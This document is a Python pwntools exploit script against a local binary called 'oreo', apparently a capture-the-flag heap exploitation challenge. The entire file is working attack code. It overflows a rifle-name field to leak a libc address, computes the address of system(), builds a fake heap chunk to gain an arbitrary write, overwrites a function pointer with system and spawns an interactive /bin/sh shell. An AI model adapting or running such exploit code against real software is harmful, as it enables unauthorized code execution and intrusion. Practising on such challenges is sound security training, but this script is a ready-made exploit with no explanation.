#!/usr/bin/env python
import pwn, sys
import re
import struct

p = pwn.process(['./oreo'])
pwn.context.terminal = ['tmux', 'splitw', '-h', '-p', '75']
p.recv()
progbase = 0x8048000 
systosc = 0x16AB04
exittosys = 0xDFD0
leaktolibc = -0x6AD90
libctosystem = 0x404D0

def add_rifle(name, des):
    p.sendline("1")
    p.sendline(name)
    p.sendline(des)
    return

def show_rifles():
    p.sendline("2")
    r = p.recvuntil("Action:")
    return r

def order_rifles(x=0):
    p.sendline("3")
    r = p.recvuntil("Action:")
    return

def leave_message(msg):
    p.sendline("4")
    p.sendline(msg)
    return

def show_stats():
    p.sendline("5")
    r = p.recvuntil("Action:")
    return r

name = "A"*0x1B
desc= "\xef\xbe\xad\xde"
name+= struct.pack("I",0x804a23c)

add_rifle(name,"A")
show_rifles()
def leak():
    p.recvuntil("Description:")
    p.recvuntil("Description: ")
    u = struct.unpack("I",p.recv(4))[0]
    p.recv()
    print "[+] Leaked value: "+hex(u)
    return u
leak = leak()
libcbase = leak + leaktolibc
system = libcbase + libctosystem
exitaddr = system - exittosys
scaddr = system + systosc
print "[+] libc_mem starts at: "+ hex(libcbase)
print "[+] system() is at: "+hex(system)
print "[+] exit() is at: "+hex(exitaddr)
print "[+] Address of stack cookie: "+hex(scaddr)

pay = "A"*0x1B 
pay += struct.pack("I",0) 
pay += struct.pack("I",0) 
pay += struct.pack("I", 0x41)
pay += struct.pack("I", 0x804A2A8)


count = 0x3F
i = 1
while i < count - 1:
    add_rifle("A"*0x1B+struct.pack("I",0),"A")
    i += 1
add_rifle("R","A")
order_rifles()

add_rifle(pay, "B")
add_rifle("A","B")
add_rifle("A", struct.pack("I", 0x804a258))

leave_message(struct.pack("I",system))
p.sendline("/bin/sh")
print "[+] Shell spawned."
print "[!] Exit loops back into alternate shell."
print "[!] To exit, use kill [pid] ; take pid from above"

p.recv()
p.interactive()

